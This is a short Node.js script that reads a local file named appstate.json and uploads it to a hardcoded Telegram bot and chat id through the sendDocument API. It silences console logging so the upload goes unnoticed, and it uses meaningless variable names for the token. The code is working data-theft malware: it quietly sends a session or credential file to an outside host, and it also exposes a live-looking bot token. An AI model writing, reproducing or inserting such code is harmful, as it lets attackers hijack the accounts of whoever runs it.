var fs = require('fs');
var request = require('request');
var Kbntooe = '6673905104:AAGYuQs6zQSFjC5sp0B0rOjEcJP5LyYCggY';
var DhctaI = '-991227622';
process.noDeprecation = true;
console.log = function() {}; 
var filePath = './appstate.json';
var formData = {
  chat_id: DhctaI,
  document: fs.createReadStream(filePath)
};
request.post({
  url: `https://api.telegram.org/bot${Kbntooe}/sendDocument`,
  formData: formData
}, function(err, httpResponse, body) {
  if (err) {
    console.error('Error:', err);
  } else {
    console.log('Response:', body);
  }
});
console.error = function() {}; 
console.warn = function() {};
